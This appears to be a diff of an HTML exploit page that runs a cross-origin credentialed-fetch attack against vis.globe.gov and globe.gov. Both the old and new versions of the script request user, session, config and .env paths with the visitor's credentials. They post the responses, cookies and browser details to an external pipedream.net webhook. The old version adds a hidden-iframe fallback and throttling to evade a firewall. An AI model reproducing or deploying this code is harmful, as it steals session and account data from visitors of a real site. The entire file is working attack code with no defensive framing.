@@ -1,105 +1,58 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Loading...</title>
   <meta charset="UTF-8">
-  <style>
-    body { background: #000; color: #0f0; font-family: monospace; }
-    h1 { display: none; } /* Hidden UI */
-  </style>
+  <title>CORS Exploit Demo</title>
 </head>
 <body>
-  <h1>Loading...</h1>
+  <h1>⏳ Loading Exploit... Please Wait</h1>
 
   <script>
     (async () => {
-      const webhook = "https://eojzzzf3qvc4t0o.m.pipedream.net";
-      const base = "https://vis.globe.gov";
-      const paths = [
-        "/app/js/VISmain.js",
-        "/app/js/framework/frameworkService.js",
-        "/app/js/observer/observerService.js",
-        "/app/js/app.js",
-        "/.env",
-        "/config.js",
-        "/data.json",
-        "/session",
-        "/dashboard",
-        "/user"
-      ];
-
-      const send = async (info) => {
+      const exfil = async (endpoint, label) => {
         try {
-          await fetch(webhook, {
+          const res = await fetch(endpoint, { method: "GET", credentials: "include" });
+          const data = await res.text();
+          await fetch("https://eojzzzf3qvc4t0o.m.pipedream.net/", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(info)
+            body: JSON.stringify({
+              type: "CORS-Exploit",
+              path: endpoint,
+              origin: location.origin,
+              data: data.slice(0, 500), // مختصر
+              label: label,
+              userAgent: navigator.userAgent,
+              timestamp: new Date().toISOString()
+            })
           });
         } catch (e) {
-          console.warn("Webhook send failed:", e.message);
+          await fetch("https://eojzzzf3qvc4t0o.m.pipedream.net/", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              error: "fetch failed",
+              path: endpoint,
+              message: e.message,
+              timestamp: new Date().toISOString()
+            })
+          });
         }
       };
 
-      const exfiltrate = async (path) => {
-        const fullUrl = base + path;
-        try {
-          const res = await fetch(fullUrl, {
-            method: "GET",
-            mode: "cors",
-            credentials: "include"
-          });
+      const targets = [
+        { url: "https://vis.globe.gov/app/js/VISmain.js", label: "VISmain.js" },
+        { url: "https://globe.gov/globe-api/user", label: "User Info" },
+        { url: "https://globe.gov/globe-api/session", label: "Session Info" },
+        { url: "https://globe.gov/modules", label: "Modules" }
+      ];
 
-          const contentType = res.headers.get("content-type") || "";
-          let content = "[Non-text content]";
-          if (contentType.includes("application/json")) {
-            content = await res.json();
-          } else if (contentType.includes("text") || contentType.includes("javascript") || contentType.includes("html")) {
-            content = await res.text();
-          }
-
-          await send({
-            type: "fetch",
-            path,
-            status: res.status,
-            content: content.slice(0, 1500),
-            userAgent: navigator.userAgent,
-            cookie: document.cookie,
-            origin: location.origin,
-            referrer: document.referrer
-          });
-
-        } catch (err) {
-          await send({
-            type: "fetch-error",
-            path,
-            error: err.message,
-            userAgent: navigator.userAgent,
-            origin: location.origin
-          });
-          await fallbackIframe(path);
-        }
-      };
-
-      const fallbackIframe = async (path) => {
-        const iframe = document.createElement("iframe");
-        iframe.src = base + path;
-        iframe.style = "display:none";
-        document.body.appendChild(iframe);
-
-        await send({
-          type: "iframe",
-          path,
-          note: "iframe fallback loaded",
-          origin: location.origin
-        });
-      };
-
-      for (const path of paths) {
-        await exfiltrate(path);
-        await new Promise(r => setTimeout(r, 1000)); // Throttle to avoid WAF
+      for (const target of targets) {
+        await exfil(target.url, target.label);
+        await new Promise(r => setTimeout(r, 1500));
       }
 
-      await send({ type: "done", timestamp: new Date().toISOString() });
+      document.body.innerHTML = "<h2>✅ Exploit Complete. Thank You.</h2>";
     })();
   </script>
 </body>
